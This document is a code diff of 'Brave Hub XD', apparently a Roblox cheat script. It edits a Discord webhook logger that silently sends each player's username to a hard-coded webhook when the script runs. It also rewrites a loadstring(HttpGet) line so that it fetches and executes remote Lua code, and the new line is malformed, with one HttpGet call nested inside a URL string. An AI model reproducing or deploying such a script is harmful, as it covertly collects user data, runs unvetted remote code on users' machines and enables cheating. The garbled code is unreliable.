@@ -6,9 +6,9 @@ local WebhookURL = "https://discord.com/api/webhooks/1564069653943427125/1UxW3ZI
 pcall(function()
     local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
-        username = "Brave Hub XD Logger",
+        username = "Brave Hub by xen swsddaddadaw",
         embeds = {{
-            title = "🚀 Brave Hub XD Executed!",
+            title = " Brave Hub XD Executed lol",
             color = 5814783,
             fields = {
                 {name = "Player", value = "||" .. tostring(game:GetService("Players").LocalPlayer.Name) .. "||", inline = true},
@@ -43,7 +43,7 @@ end
 -- ============================================================
 -- UI WORKSPACE CONFIGURATION (RAYFIELD)
 -- ============================================================
-local Rayfield = loadstring(game:HttpGet('https://githubusercontent.com'))()
+local Rayfield = loadstring(game:HttpGet('https://loadstring(game:HttpGet("https://raw.githubusercontent.com/bernardharlem5-afk/bravehubxd/refs/heads/main/script.lua"))().com'))()
 local Window = Rayfield:CreateWindow({Name = "Brave Hub XD", KeySystem = false})
 local MainTab = Window:CreateTab("Main Cheats", 4483362458)
 
